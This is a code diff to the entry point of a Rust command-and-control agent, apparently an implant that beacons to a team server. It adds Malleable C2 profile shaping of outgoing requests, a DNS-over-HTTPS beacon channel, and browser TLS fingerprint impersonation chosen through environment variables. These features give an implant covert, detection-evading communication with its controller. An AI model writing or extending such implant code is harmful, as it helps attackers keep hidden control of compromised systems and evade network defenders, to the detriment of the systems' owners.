@@ -35,9 +35,11 @@ fn main() -> anyhow::Result<()> {
             work_dir.display()
         )
     })?;
-    let beacon_uri = std::env::var("NYX_BEACON_URI").unwrap_or_else(|_| "/beacon".to_string());
-    // Optional Malleable C2 profile: when set, the agent inverts the profile's
-    // server.output envelope on responses (mirrors the server's shaping).
+    // Optional Malleable C2 profile: when set, the agent applies the profile's
+    // http-post client envelope on each send (steps + headers + UA + URI) and
+    // inverts the server.output envelope on responses — the same two-sided
+    // shaping the PIC implant applies. The beacon URI defaults to the
+    // profile's http-post uri when the profile declares one.
     let profile = match std::env::var("NYX_PROFILE") {
         Ok(p) => {
             let src = std::fs::read_to_string(&p)?;
@@ -45,6 +47,40 @@ fn main() -> anyhow::Result<()> {
         }
         Err(_) => None,
     };
+    let beacon_uri = match std::env::var("NYX_BEACON_URI") {
+        Ok(u) if !u.is_empty() => u,
+        _ => profile
+            .as_ref()
+            .and_then(|p| p.http_post())
+            .and_then(|b| b.get("uri"))
+            .map(|u| u.as_str().into_owned())
+            .unwrap_or_else(|| "/beacon".to_string()),
+    };
+    // Beacon channel: https (default) or doh (spec-2, against the team
+    // server's /dns-query responder).
+    let channel = match std::env::var("NYX_CHANNEL").as_deref() {
+        Ok("doh") => nyx_agent_dev::BeaconChannelKind::Doh,
+        _ => nyx_agent_dev::BeaconChannelKind::Https,
+    };
+    let doh_server =
+        std::env::var("NYX_DOH_SERVER").unwrap_or_else(|_| format!("{server_url}/dns-query"));
+    let doh_domain = std::env::var("NYX_DOH_DOMAIN").unwrap_or_default();
+    // Browser TLS impersonation (requires the `impersonation` feature):
+    // chrome | firefox | safari | edge.
+    let impersonate = match std::env::var("NYX_IMERSONATE").as_deref() {
+        Ok("chrome") => Some(nyx_transport::fingerprint::BrowserProfile::Chrome),
+        Ok("firefox") => Some(nyx_transport::fingerprint::BrowserProfile::Firefox),
+        Ok("safari") => Some(nyx_transport::fingerprint::BrowserProfile::Safari),
+        Ok("edge") => Some(nyx_transport::fingerprint::BrowserProfile::Edge),
+        _ => None,
+    };
+    #[cfg(not(feature = "impersonation"))]
+    if impersonate.is_some() {
+        tracing::warn!(
+            "NYX_IMERSONATE is set but this build lacks the `impersonation` feature; \
+             using the plain ureq client (rebuild with --features impersonation)"
+        );
+    }
     nyx_agent_dev::run(Config {
         server_url,
         server_pub,
@@ -53,5 +89,9 @@ fn main() -> anyhow::Result<()> {
         work_dir,
         beacon_uri,
         profile,
+        channel,
+        doh_server,
+        doh_domain,
+        impersonate,
     })
 }
